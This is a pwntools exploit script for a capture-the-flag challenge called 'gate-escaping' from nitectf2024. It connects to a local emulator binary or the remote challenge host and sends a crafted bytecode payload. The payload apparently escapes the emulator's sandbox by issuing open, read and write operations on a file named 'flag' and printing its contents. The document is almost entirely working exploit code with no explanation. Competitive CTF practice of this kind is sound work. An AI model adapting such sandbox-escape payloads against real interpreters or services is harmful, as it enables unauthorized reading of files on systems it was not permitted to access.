from pwn import *
from icecream import ic

elf = exe = ELF("./emulator")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("gate-escaping.chals.nitectf2024.live", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x555555556795
b *0x555555555758
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

payload = b'\x91'*6

sla(b'choose your path (0-3):', b'1')

dataind = 0
def store(test):
    global dataind
    global payload
    hold = dataind
    for i in range(len(test)):
        payload += b'\x28\xe1'
        payload += test[i].encode()
        payload += b'\x24\xe1'
        payload += p8(dataind)
        dataind += 1
    payload += b'\x28\xe1\x01\x28\xe2'
    payload += p8(hold)

store('flag\x00')
payload += b'\x28\xe1\x00\x28\xe2\x00\xff\x23'
if args.REMOTE:
    fd = '\x05'
else:
    fd = '\x03'
payload += f'\x28\xe1{fd}\x28\xe2\x00\x28\xe3\x40\xff\x2d'.encode('latin-1')
payload += b'\x28\xe1\x01\x28\xe2\x00\xff\x2e'
# payload = payload.ljust(95, b'\x91')
# payload += b'\x28\xe3\x0b\xff\x2e\x28'
# payload = b'\x91'*95
sla(b'a gate asks for your wishes: ', payload)
sl(b'5')
io.interactive()
